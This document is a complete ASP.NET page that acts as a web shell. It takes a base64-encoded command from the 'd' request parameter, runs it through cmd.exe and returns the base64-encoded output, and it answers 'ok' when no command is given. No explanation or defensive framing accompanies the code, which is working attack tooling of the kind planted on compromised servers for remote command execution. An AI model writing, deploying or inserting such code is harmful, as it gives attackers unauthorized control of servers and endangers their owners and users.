<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string d = Request["d"];
    if (string.IsNullOrEmpty(d)) { Response.Write("ok"); return; }

    try
    {
        // Base64 decode the command
        byte[] b = Convert.FromBase64String(d);
        string cmd = Encoding.UTF8.GetString(b);

        // Execute
        var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        var p = Process.Start(psi);
        string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        p.WaitForExit();

        // Base64 encode output
        Response.Write(Convert.ToBase64String(Encoding.UTF8.GetBytes(o)));
    }
    catch (Exception ex)
    {
        Response.Write("ERR:" + ex.Message);
    }
}
</script>
